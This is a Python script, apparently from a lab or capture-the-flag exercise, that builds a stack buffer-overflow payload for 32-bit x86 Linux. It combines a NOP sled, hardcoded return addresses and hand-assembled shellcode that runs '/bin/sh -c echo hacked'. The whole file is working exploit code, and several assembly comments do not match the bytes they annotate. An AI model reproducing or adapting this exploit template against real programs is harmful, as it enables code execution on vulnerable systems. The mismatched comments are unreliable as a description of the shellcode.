#!/usr/bin/env python
import struct as s, os

trash = '_' * 510
ip = s.pack('I', 0xbffffc80)
noops = '\x90' * 128
ret = s.pack('i', 0x080484f9)
int3 = '\xcc' * 4

shellcode = ("\x6a\x0b"             +  #  push   $0xb
             "\x58"                 +  #  pop    %eax
             "\x99"                 +  #  cltd
             "\x52"                 +  #  push   %edx
             "\x68ked "             +  #  push   $0x6f686c61
             "\x68 hac"             +  #  push   $0x636f6c20
             "\x68echo"             +  #  push   $0x676e6970
             "\x89\xe6"             +  #  mov    %esp,%esi
             "\x52"                 +  #  push   %edx
             "\x66\x68\x2d\x63"     +  #  pushw  $0x632d
             "\x89\xe1"             +  #  mov    %esp,%ecx
             "\x52"                 +  #  push   %edx
             "\x68//sh"             +  #  push   $0x68732f2f
             "\x68/bin"             +  #  push   $0x6e69622f
             "\x89\xe3"             +  #  mov    %esp,%ebx
             "\x52"                 +  #  push   %edx
             "\x56"                 +  #  push   %esi
             "\x51"                 +  #  push   %ecx
             "\x53"                 +  #  push   %ebx
             "\x89\xe1"             +
             "\xcd\x80")
shellcode += '\x90'*100
payload = "\x0d" + "\x90"*(532-len(shellcode)-1) + shellcode + "\x93\x98\x04\x08" + "\x9e\xfa\xff\xbf"
print(payload)
